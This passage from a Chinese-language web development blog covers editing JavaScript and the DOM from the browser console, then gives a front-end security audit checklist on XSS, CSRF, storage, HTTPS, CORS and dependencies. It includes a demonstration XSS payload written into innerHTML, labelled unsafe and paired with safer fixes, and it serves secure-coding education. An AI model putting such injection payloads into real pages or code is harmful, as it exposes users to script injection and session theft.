function!&quot;</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>现在在控制台中输入以下代码重定义函数：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">javascript复制代码greet = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Hello from modified function!&quot;</span>);<br>&#125;;<br>greet();  <span class="hljs-comment">// 输出 &quot;Hello from modified function!&quot;</span><br></code></pre></td></tr></table></figure><h3 id="二、修改-DOM-元素"><a href="#二、修改-DOM-元素" class="headerlink" title="二、修改 DOM 元素"></a>二、修改 DOM 元素</h3><p>控制台允许你动态操作页面的 DOM 元素，修改元素的内容、属性和样式。这是前端开发和调试中非常常用的功能。</p><h4 id="2-1-修改元素的内容"><a href="#2-1-修改元素的内容" class="headerlink" title="2.1 修改元素的内容"></a>2.1 修改元素的内容</h4><p>你可以选择页面上的任何 DOM 元素，并通过控制台修改它的内容。</p><p><strong>步骤：</strong></p><ol><li>在控制台中输入 <code>document.querySelector</code> 来选择页面元素。</li><li>使用 <code>.textContent</code> 或 <code>.innerHTML</code> 来修改元素的内容。</li></ol><p><strong>示例：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">html<br>复制代码<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;heading&quot;</span>&gt;</span>Original Heading<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在控制台中输入以下代码来修改标题内容：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">javascript<br>复制代码<br><span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#heading&#x27;</span>).textContent = <span class="hljs-string">&#x27;Modified Heading&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="2-2-修改元素的样式"><a href="#2-2-修改元素的样式" class="headerlink" title="2.2 修改元素的样式"></a>2.2 修改元素的样式</h4><p>你也可以直接通过控制台修改 HTML 元素的样式，来测试视觉效果。</p><p><strong>步骤：</strong></p><ol><li>通过控制台选择页面元素。</li><li>使用 <code>.style</code> 来修改元素的内联样式。</li></ol><p><strong>示例：</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">html<br>复制代码<br>&lt;p <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;paragraph&quot;</span>&gt;This <span class="hljs-keyword">is</span> a <span class="hljs-built_in">paragraph</span>.&lt;/p&gt;<br></code></pre></td></tr></table></figure><p>在控制台中输入以下代码来修改段落的颜色和字体大小：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">javascript复制代码let paragraph = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;#paragraph&#x27;</span>);<br>paragraph.style.color = <span class="hljs-string">&#x27;red&#x27;</span>;<br>paragraph.style.fontSize = <span class="hljs-string">&#x27;24px&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="2-3-添加和删除-DOM-元素"><a href="#2-3-添加和删除-DOM-元素" class="headerlink" title="2.3 添加和删除 DOM 元素"></a>2.3 添加和删除 DOM 元素</h4><p>除了修改已有的 DOM 元素外，你还可以通过控制台添加或删除元素。</p><p><strong>步骤：</strong></p><ol><li>使用 <code>document.createElement</code> 创建新元素。</li><li>使用 <code>appendChild</code> 或 <code>removeChild</code> 来添加或删除元素。</li></ol><p><strong>示例：</strong> 在控制台中添加一个新的 <code>div</code> 元素到页面：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">javascript复制代码let newDiv = document.createElement(<span class="hljs-symbol">&#x27;div</span>&#x27;);<br>newDiv.textContent = <span class="hljs-symbol">&#x27;This</span> <span class="hljs-keyword">is</span> a <span class="hljs-keyword">new</span> div!&#x27;;<br>document.<span class="hljs-keyword">body</span>.appendChild(newDiv);<br></code></pre></td></tr></table></figure><p>要删除该元素：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">javascript<br>复制代码<br>document.body.removeChild(newDiv)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="三、调试-JavaScript-代码"><a href="#三、调试-JavaScript-代码" class="headerlink" title="三、调试 JavaScript 代码"></a>三、调试 JavaScript 代码</h3><p>控制台不仅可以修改代码，还可以帮助你调试页面中的 JavaScript。常用的方法包括：</p><ol><li><strong>插入断点：</strong>你可以在代码执行的特定位置插入断点，并通过控制台监控变量的值和代码的执行流程。</li><li><strong>使用 <code>console.log</code> 追踪变量：</strong>通过在控制台中输出变量值，来追踪代码的执行和状态。</li></ol><h4 id="3-1-插入-console-log-进行调试"><a href="#3-1-插入-console-log-进行调试" class="headerlink" title="3.1 插入 console.log 进行调试"></a>3.1 插入 <code>console.log</code> 进行调试</h4><p>在控制台中你可以插入调试代码，比如<code>console.log</code>，来查看函数中的变量或输出信息，调试过程中常用。</p><p><strong>步骤：</strong></p><ol><li>在控制台中运行代码，监控某些关键变量。</li><li>使用 <code>console.log()</code> 输出信息。</li></ol><p><strong>示例：</strong></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xquery">html复制代码<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateSum</span>(<span class="hljs-params">a, b</span>) </span></span><span class="language-xquery">&#123;</span><br><span class="language-xquery">    <span class="hljs-keyword">let</span><span class="hljs-built_in"> sum</span> = a + b;</span><br><span class="language-xquery">    <span class="hljs-keyword">return</span><span class="hljs-built_in"> sum</span>;</span><br><span class="language-xquery">  &#125;</span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>在控制台中修改代码并添加调试信息：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">javascript复制代码<span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateSum</span>(<span class="hljs-params">a, b</span>) &#123;<br>  let <span class="hljs-built_in">sum</span> = a + b;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;The sum is:&#x27;</span>, <span class="hljs-built_in">sum</span>);  <span class="hljs-comment">// 输出 sum 值</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>;<br>&#125;<br>calculateSum(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>);  <span class="hljs-comment">// 控制台中输出 &quot;The sum is: 15&quot;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-插入断点调试"><a href="#3-2-插入断点调试" class="headerlink" title="3.2 插入断点调试"></a>3.2 插入断点调试</h4><p>通过 Chrome DevTools，你可以在 <code>Sources</code> 面板中为 JavaScript 文件设置断点，并通过控制台查看变量的状态，调试流程如下：</p><ol><li>打开 DevTools，点击 <code>Sources</code> 面板。</li><li>打开包含 JavaScript 代码的文件。</li><li>点击行号设置断点。</li><li>刷新页面或触发代码执行，程序将在断点处暂停，此时可以在控制台中检查变量值。</li></ol><h3 id="四、临时注入新代码"><a href="#四、临时注入新代码" class="headerlink" title="四、临时注入新代码"></a>四、临时注入新代码</h3><p>你可以在控制台中临时注入新代码，比如为按钮添加新的点击事件，修改页面的交互逻辑。</p><h4 id="4-1-添加事件监听器"><a href="#4-1-添加事件监听器" class="headerlink" title="4.1 添加事件监听器"></a>4.1 添加事件监听器</h4><p><strong>步骤：</strong></p><ol><li>使用 <code>addEventListener</code> 为页面中的元素添加事件。</li><li>在控制台中注入该代码，点击按钮时会执行新添加的事件处理程序。</li></ol><p><strong>示例：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">html<br>复制代码<br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myButton&quot;</span>&gt;</span>Click Me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在控制台中为按钮添加点击事件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascript复制代码<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#myButton&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Button clicked!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>点击按钮时，将弹出一个提示框。</p><h3 id="五、查看和修改-JavaScript-对象"><a href="#五、查看和修改-JavaScript-对象" class="headerlink" title="五、查看和修改 JavaScript 对象"></a>五、查看和修改 JavaScript 对象</h3><p>在控制台中可以查看 JavaScript 对象的详细信息，并动态修改对象的属性和方法。</p><h4 id="5-1-查看对象的结构"><a href="#5-1-查看对象的结构" class="headerlink" title="5.1 查看对象的结构"></a>5.1 查看对象的结构</h4><p>使用 <code>console.dir()</code> 来查看 JavaScript 对象的详细结构。</p><p><strong>步骤：</strong></p><ol><li>在控制台中使用 <code>console.dir()</code>。</li><li>通过点击展开查看对象的所有属性和方法。</li></ol><p><strong>示例：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascript复制代码<span class="hljs-keyword">let</span> person = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>, <span class="hljs-attr">job</span>: <span class="hljs-string">&#x27;Developer&#x27;</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">dir</span>(person);<br></code></pre></td></tr></table></figure><h4 id="5-2-修改对象属性"><a href="#5-2-修改对象属性" class="headerlink" title="5.2 修改对象属性"></a>5.2 修改对象属性</h4><p>你可以通过控制台直接修改对象的属性。</p><p><strong>步骤：</strong></p><ol><li>通过控制台访问对象并修改其属性。</li><li>查看修改后的效果。</li></ol><p><strong>示例：</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">javascript复制代码person.age = <span class="hljs-number">30</span>;<br>console.log(person);  // 输出 &#123;<span class="hljs-type">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, age: <span class="hljs-number">30</span>, job: <span class="hljs-string">&#x27;Developer&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="六、临时修改网页中的-JavaScript-逻辑"><a href="#六、临时修改网页中的-JavaScript-逻辑" class="headerlink" title="六、临时修改网页中的 JavaScript 逻辑"></a>六、临时修改网页中的 JavaScript 逻辑</h3><p>如果你想要临时修改网页中的 JavaScript 逻辑，可以通过在控制台中添加新的代码块来实现。</p><h4 id="6-1-注入新的逻辑"><a href="#6-1-注入新的逻辑" class="headerlink" title="6.1 注入新的逻辑"></a>6.1 注入新的逻辑</h4><p>你可以动态注入一段新的 JavaScript 代码来改变网页的行为，测试特定功能或行为。</p><p><strong>示例：</strong></p><p>假设页面有一个提交按钮，你想在提交之前增加额外的检查，可以这样做：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascript复制代码<span class="hljs-keyword">let</span> submitButton = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#submitButton&#x27;</span>);<br>submitButton.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#checkbox&#x27;</span>).<span class="hljs-property">checked</span>) &#123;<br>    event.<span class="hljs-title function_">preventDefault</span>();  <span class="hljs-comment">// 阻止提交</span><br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;You must agree to the terms!&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在控制台中，你可以动态修改 JavaScript 代码、DOM 元素、事件处理程序以及对象属性。这种修改只在当前页面加载周期内有效，刷新页面后会恢复为原始状态。控制台提供了极大的灵活性，可以帮助你调试、测试和临时修改网页行为，同时也可以用于开发过程中快速验证想法。</p><p>JavaScript 的安全性审计是确保应用程序不会因为 JavaScript 的漏洞或不当使用而遭受攻击的关键环节。Web 应用程序的安全性很大程度上依赖于前端 JavaScript 代码的安全性，因为它直接与用户交互，同时处理输入、发起请求，并控制页面逻辑。通过安全性审计，可以发现潜在的安全漏洞，如跨站脚本攻击（XSS）、跨站请求伪造（CSRF）、点击劫持、代码注入等。</p><p>在 JavaScript 安全性审计中，主要从<strong>输入验证、安全编码实践、库和依赖的审计、前端存储和网络请求安全性</strong>等方面进行。以下将详细讲述如何对 JavaScript 代码进行全面的安全性审计。</p><hr><h3 id="一、输入验证"><a href="#一、输入验证" class="headerlink" title="一、输入验证"></a>一、输入验证</h3><p>JavaScript 的输入验证是审计的首要环节，因为不可信的用户输入是攻击的最常见来源。前端的输入验证应被视为<strong>第一道防线</strong>，但不能依赖其完全阻止攻击，后端必须同样严格验证输入。前端的输入验证主要用于提升用户体验、减少不必要的请求。</p><h4 id="1-1-前端输入验证检查"><a href="#1-1-前端输入验证检查" class="headerlink" title="1.1 前端输入验证检查"></a>1.1 前端输入验证检查</h4><ol><li><p><strong>缺失或不当的验证逻辑：</strong></p><ul><li>确保所有输入数据，包括表单、URL 参数、AJAX 请求、用户交互的文件或图片等，都进行了初步的验证。</li><li>检查是否有输入长度限制、字符类型限制（如仅接受数字或字母）、必填项等。</li></ul></li><li><p><strong>防止脚本注入：</strong></p><ul><li>防止用户通过输入恶意脚本来进行代码注入（如 XSS 攻击）。特别是<code>&lt;script&gt;</code>标签或类似的代码应被严格过滤。</li></ul><p><strong>示例：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 不安全的处理方式：直接在页面中显示用户输入的内容</span><br><span class="hljs-keyword">let</span> userInput = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;XSS Attack&#x27;);&lt;/script&gt;&quot;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = userInput;  <span class="hljs-comment">// XSS 攻击</span><br> <br><span class="hljs-comment">// 安全的做法：使用 textContent 插入纯文本，避免 XSS</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">textContent</span> = userInput;<br></code></pre></td></tr></table></figure></li><li><p><strong>使用正则表达式进行输入过滤：</strong></p><ul><li>使用正则表达式对输入进行有效性检查，但确保正则表达式足够安全，不会引发拒绝服务攻击（ReDoS），即恶意用户通过构造复杂输入触发正则表达式的性能问题，导致服务器响应过慢甚至崩溃。</li></ul><p><strong>示例：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">validateInput</span>(<span class="hljs-params">input</span>) &#123;<br>  <span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/^[a-zA-Z0-9]+$/</span>;  <span class="hljs-comment">// 仅允许字母和数字</span><br>  <span class="hljs-keyword">return</span> regex.<span class="hljs-title function_">test</span>(input);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>防止HTML实体注入：</strong></p><ul><li>不允许用户在输入中插入 HTML 标签、实体等。可以使用库对输入进行 HTML 实体编码或过滤（例如<code>DOMPurify</code>）。</li></ul></li></ol><hr><h3 id="二、跨站脚本攻击-XSS-防护"><a href="#二、跨站脚本攻击-XSS-防护" class="headerlink" title="二、跨站脚本攻击 (XSS) 防护"></a>二、跨站脚本攻击 (XSS) 防护</h3><p><strong>XSS</strong> 攻击是一种最常见的 Web 攻击类型，攻击者通过注入恶意 JavaScript 脚本，在其他用户的浏览器上执行。攻击者通常利用不安全的输入处理，将恶意代码注入到页面中，以窃取敏感信息（如 cookie、会话令牌）、劫持用户账户等。</p><h4 id="2-1-XSS-的类型"><a href="#2-1-XSS-的类型" class="headerlink" title="2.1 XSS 的类型"></a>2.1 XSS 的类型</h4><ol><li><p><strong>存储型 XSS</strong>：</p><ul><li>恶意脚本被存储在服务器端数据库中，每次当用户访问相关页面时，脚本会被执行。例如，攻击者通过留言板插入恶意脚本，当其他用户查看时，脚本执行。</li></ul></li><li><p><strong>反射型 XSS</strong>：</p><ul><li>恶意脚本被即时执行，通常嵌入在 URL 中。例如，通过欺骗用户点击一个恶意链接，该链接包含了攻击者的 JavaScript 代码，该代码会在用户浏览器中执行。</li></ul></li><li><p><strong>DOM 型 XSS</strong>：</p><ul><li>攻击者利用不安全的 JavaScript 操作来修改页面的 DOM 树，使恶意代码被注入并执行。这种攻击发生在客户端，无需与服务器交互。</li></ul></li></ol><h4 id="2-2-XSS-防护措施"><a href="#2-2-XSS-防护措施" class="headerlink" title="2.2 XSS 防护措施"></a>2.2 XSS 防护措施</h4><ol><li><p>**避免直接使用 <code>innerHTML</code> 或 <code>document.write()</code>**：</p><ul><li>避免直接将不可信的输入插入 DOM。应使用更安全的 <code>textContent</code> 或 <code>innerText</code>，将用户输入作为纯文本插入，而不是作为 HTML。</li></ul><p><strong>不安全的示例：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> userComment = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&quot;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = userComment;  <span class="hljs-comment">// 可能导致XSS</span><br></code></pre></td></tr></table></figure><p><strong>安全的替代方式：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">textContent</span> = userComment;  <span class="hljs-comment">// 安全</span><br></code></pre></td></tr></table></figure></li><li><p><strong>使用可信的库进行转义</strong>：</p><ul><li>使用库如 <code>DOMPurify</code> 对用户生成的内容进行清理和过滤，确保在插入 DOM 时已经移除了可能的恶意代码。</li><li>对所有输入都进行 HTML 转义，避免特殊字符（如 <code>&lt;</code> 和 <code>&gt;</code>）被解释为 HTML 代码。</li></ul><p><strong>示例：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> sanitizedInput = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(userInput);<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = sanitizedInput;<br></code></pre></td></tr></table></figure></li><li><p><strong>CSP（内容安全策略）</strong>：</p><ul><li>内容安全策略（CSP）是一种有效的 XSS 防护机制，它允许服务器指定浏览器只加载和执行来自可信源的 JavaScript 代码。通过设置严格的 CSP 头，可以防止页面加载和执行恶意脚本。</li></ul><p><strong>示例：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; style-src &#x27;self&#x27;;<br></code></pre></td></tr></table></figure></li></ol><hr><h3 id="三、跨站请求伪造-CSRF-防护"><a href="#三、跨站请求伪造-CSRF-防护" class="headerlink" title="三、跨站请求伪造 (CSRF) 防护"></a>三、跨站请求伪造 (CSRF) 防护</h3><p><strong>CSRF</strong> 是一种攻击手法，攻击者通过伪造受害者的身份，发送未经授权的请求。攻击的本质是利用了受害者的认证状态（如登录会话、Cookie），在未经用户同意的情况下，执行恶意操作。</p><h4 id="3-1-CSRF-攻击的防护措施"><a href="#3-1-CSRF-攻击的防护措施" class="headerlink" title="3.1 CSRF 攻击的防护措施"></a>3.1 CSRF 攻击的防护措施</h4><ol><li><p><strong>CSRF 令牌</strong>：</p><ul><li>每次用户发送请求时，服务器生成一个随机的 CSRF 令牌，并将其包含在表单或 AJAX 请求中。服务器验证该令牌的合法性，防止攻击者伪造请求。</li><li>在 JavaScript 中，确保请求时将 CSRF 令牌包含在请求的头部或表单中。</li></ul><p><strong>示例：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/api/submit&quot;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>    <span class="hljs-string">&quot;CSRF-Token&quot;</span>: csrfToken  <span class="hljs-comment">// 包含CSRF令牌</span><br>  &#125;,<br>  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">data</span>: <span class="hljs-string">&quot;user data&quot;</span> &#125;)<br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p><strong>双重 Cookie 防护</strong>：</p><ul><li>一种常见的策略是使用双重 Cookie：一个是标准的会话 Cookie，另一个是 HTTP 头中发送的 CSRF 令牌。这种方式可以确保请求必须来自合法的用户端。</li></ul></li></ol><hr><h3 id="四、前端存储的安全性"><a href="#四、前端存储的安全性" class="headerlink" title="四、前端存储的安全性"></a>四、前端存储的安全性</h3><p>Web 应用中前端存储的数据（如 <code>LocalStorage</code> 和 <code>SessionStorage</code>）也存在安全隐患，尤其是处理敏感数据时，需要特别小心。因为前端存储的数据是可以被浏览器中的任何脚本读取的。</p><h4 id="4-1-避免存储敏感数据"><a href="#4-1-避免存储敏感数据" class="headerlink" title="4.1 避免存储敏感数据"></a>4.1 避免存储敏感数据</h4><ol><li><p><strong>敏感数据不应存储在 LocalStorage 或 SessionStorage</strong>：</p><ul><li>不要将敏感信息（如用户的登录凭证、密码、令牌等）直接存储在 <code>LocalStorage</code> 或 <code>SessionStorage</code> 中，因为它们对 JavaScript 代码完全公开，任何脚本（包括 XSS）都可以访问这些存储数据。</li><li>如果需要使用会话令牌，应该存储在 Cookie 中，并使用 <code>HttpOnly</code> 和 <code>Secure</code> 标志，确保 JavaScript 无法访问，且只在 HTTPS 连接中传输。</li></ul></li><li><p><strong>加密存储</strong>：</p><ul><li>对存储的数据进行加密，即使攻击者能够读取存储的内容，也无法轻易解密这些信息。</li><li>但应注意，前端的加密密钥也不能存储在客户端代码中，因为这样会暴露给潜在的攻击者。</li></ul></li></ol><hr><h3 id="五、网络请求的安全性"><a href="#五、网络请求的安全性" class="headerlink" title="五、网络请求的安全性"></a>五、网络请求的安全性</h3><p>JavaScript 通常用于发起网络请求（如 AJAX、Fetch API 等），因此请求的安全性也是审计的重点。确保数据传输的安全，防止网络层面上的攻击。</p><h4 id="5-1-HTTPS-加密通信"><a href="#5-1-HTTPS-加密通信" class="headerlink" title="5.1 HTTPS 加密通信"></a>5.1 HTTPS 加密通信</h4><ol><li><p><strong>确保所有请求都通过 HTTPS 进行传输</strong>：</p><ul><li>通过 HTTPS 可以确保数据在客户端和服务器之间的传输是加密的，防止中间人攻击（MITM）。</li><li>在 JavaScript 中，确保请求的 URL 都是 HTTPS 地址，而不是 HTTP。</li></ul></li><li><p>**验证服务器</p></li></ol><p>的 SSL 证书**：</p><ul><li>如果网站没有正确配置 SSL 证书，浏览器会提醒用户连接不安全，导致信任问题。应确保服务器配置了有效的 SSL 证书，且不会过期。</li></ul><h4 id="5-2-防止-API-滥用和-CSRF"><a href="#5-2-防止-API-滥用和-CSRF" class="headerlink" title="5.2 防止 API 滥用和 CSRF"></a>5.2 防止 API 滥用和 CSRF</h4><ol><li><p><strong>使用适当的身份验证和授权机制</strong>：</p><ul><li>通过令牌（如 JWT 或 OAuth）进行身份验证，并确保每个请求都带有合法的身份验证令牌。</li></ul></li><li><p><strong>限制请求来源</strong>：</p><ul><li>使用 CORS（跨域资源共享）头，指定哪些域名可以合法访问 API。确保服务器只接受来自可信域的请求，防止恶意网站滥用 API。</li></ul><p><strong>示例：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://trusted-domain.com;<br></code></pre></td></tr></table></figure></li></ol><hr><h3 id="六、依赖和第三方库的安全性"><a href="#六、依赖和第三方库的安全性" class="headerlink" title="六、依赖和第三方库的安全性"></a>六、依赖和第三方库的安全性</h3><p>JavaScript 项目中使用第三方库时，必须确保这些库是安全的，因为它们可能包含漏洞或恶意代码。</p><h4 id="6-1-审查和更新依赖库"><a href="#6-1-审查和更新依赖库" class="headerlink" title="6.1 审查和更新依赖库"></a>6.1 审查和更新依赖库</h4><ol><li><p><strong>定期更新第三方库</strong>：</p><ul><li>使用 <code>npm audit</code> 或类似工具，定期检查项目中是否存在安全漏洞。更新到最新的稳定版本，以修补已知的安全问题。</li></ul><p><strong>示例：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm audit fix<br></code></pre></td></tr></table></figure></li><li><p><strong>使用受信任的库源</strong>：</p><ul><li>只从可信赖的源下载和安装库。避免使用来源不明的库，防止供应链攻击（供应链攻击是指攻击者通过修改合法软件包的代码来传播恶意软件）。</li></ul></li><li><p><strong>移除未使用的依赖</strong>：</p><ul><li>不使用的库和代码可能成为潜在的安全隐患。定期清理项目，确保只保留必要的依赖项。</li></ul></li></ol><hr><h3 id="七、前端代码的混淆与保护"><a href="#七、前端代码的混淆与保护" class="headerlink" title="七、前端代码的混淆与保护"></a>七、前端代码的混淆与保护</h3><p>前端代码是完全公开的，任何用户都可以查看源码。因此，在某些敏感应用场景下，应考虑对前端 JavaScript 代码进行混淆，增加反向工程的难度。</p><h4 id="7-1-代码混淆和压缩"><a href="#7-1-代码混淆和压缩" class="headerlink" title="7.1 代码混淆和压缩"></a>7.1 代码混淆和压缩</h4><ol><li><p><strong>使用工具混淆代码</strong>：</p><ul><li>使用工具如 UglifyJS 或 Terser 来压缩和混淆 JavaScript 代码，使其难以被理解。这可以防止一些低水平的攻击者直接查看代码逻辑。</li></ul></li><li><p><strong>谨慎使用敏感数据</strong>：</p><ul><li>即便进行了混淆，敏感逻辑或数据仍然不应该放置在前端代码中。应确保所有敏感逻辑尽可能放置在后端服务器上执行。</li></ul></li></ol><hr><p>将 JavaScript 嵌入 HTML 有多种方式，每种方式都适用于不同的场景，具体的选择取决于代码的大小、复用需求以及性能优化的考虑。以下是将 JavaScript 嵌入 HTML 的几种主要方式，以及它们的用法和适用场景。</p><h3 id="1-内联-JavaScript"><a href="#1-内联-JavaScript" class="headerlink" title="1. 内联 JavaScript"></a>1. <strong>内联 JavaScript</strong></h3><p>内联 JavaScript 是将 JavaScript 代码直接嵌入到 HTML 标签的 <code>script</code> 